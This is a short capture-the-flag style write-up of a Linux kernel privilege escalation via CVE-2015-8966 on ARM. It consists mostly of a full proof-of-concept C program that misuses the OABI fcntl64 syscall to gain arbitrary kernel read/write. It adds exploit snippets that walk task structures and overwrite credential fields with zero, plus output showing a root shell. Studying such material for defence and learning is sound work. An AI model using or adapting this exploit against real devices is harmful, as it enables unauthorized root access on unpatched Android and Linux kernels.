# 1118daysober

## PoC

- https://github.com/ThomasKing2014/android-Vulnerability-PoC/blob/master/CVE-2015-8966/poc.c

```c
#define _GNU_SOURCE

#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <pthread.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <semaphore.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <sys/utsname.h>
#include <sys/ptrace.h>

int try_to_read_kernel(){
  int pipefd[2];
  ssize_t len;
  ssize_t try_bytes = 4;
  
  pipe(pipefd);
  len = write(pipefd[1], (void*)0xc0008000, try_bytes);
  
  close(pipefd[0]);
  close(pipefd[1]);
  
  return len == try_bytes;
}

__attribute__((naked)) long sys_oabi_fcntl64(unsigned int fd, unsigned int cmd, unsigned long arg){
	
	__asm __volatile (
	"swi	0x9000DD\n"
	"mov	pc, lr\n"
	:   
	:
	:
	);
}

#define F_OFD_GETLK	36
#define F_OFD_SETLK	37
#define F_OFD_SETLKW 38


int main(int argc, char const *argv[]){
	int fd = open("/proc/cpuinfo", O_RDONLY);
	struct flock *map_base = 0;

	if(fd == -1){
		perror("open");
		return -1;
	}
	map_base = (struct flock *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if(map_base == (void*)-1){
		perror("mmap");
		goto _done;
	}
	printf("map_base %p\n", map_base);
	memset(map_base, 0, 0x1000);
	map_base->l_start = SEEK_SET;
	if(sys_oabi_fcntl64(fd, F_OFD_GETLK, (long)map_base)){
		perror("sys_oabi_fcntl64");
	}
	// Arbitrary kernel read/write test
	if(try_to_read_kernel()){
		printf("pwnned !\n");
	}
	munmap(map_base, 0x1000);
_done:
	close(fd);
	return 0;
}
```

## Vuln

- kernel doesn't restore to user_ds. So, we can write any data at any kernel address.
- so that I can't force to restore user_ds.
- detail: https://thomasking2014.com/2016/12/05/CVE-2015-8966.html

## Exploit

- I use read data with o/r/w syscall. It doesn't use user space address, so kernel was not crashed.

```c
int junofd = open("./tmp", O_WRONLY);
write(junofd, f_task, 4);
close(junofd);

int junofd2 = open("./tmp_cred", O_WRONLY);
write(junofd, f_task+400-4, 4);
close(junofd);
```

- save task_structure's next ptr to ./tmp and task's cred ptr to ./tmp_cred
- run until comm equals to `sh`.

```c
write(pipefd[1], cred+0x30, 4);
read(pipefd[0], cred+4, 4);
write(pipefd[1], cred+0x30, 4);
read(pipefd[0], cred+8, 4);
write(pipefd[1], cred+0x30, 4);
read(pipefd[0], cred+12, 4);
write(pipefd[1], cred+0x30, 4);
read(pipefd[0], cred+16, 4);
write(pipefd[1], cred+0x30, 4);
read(pipefd[0], cred+20, 4);
write(pipefd[1], cred+0x30, 4);
read(pipefd[0], cred+24, 4);
write(pipefd[1], cred+0x30, 4);
read(pipefd[0], cred+28, 4);
write(pipefd[1], cred+0x30, 4);
read(pipefd[0], cred+32, 4);
```

- finally overwrite cred value (0x3e8 to 0x0)
- I moved binary file with `base64` command.

```
~ $ ./w
[+] gogo cred haha
do
done!
/home/user # id
uid=0(root) gid=0 groups=1000
```

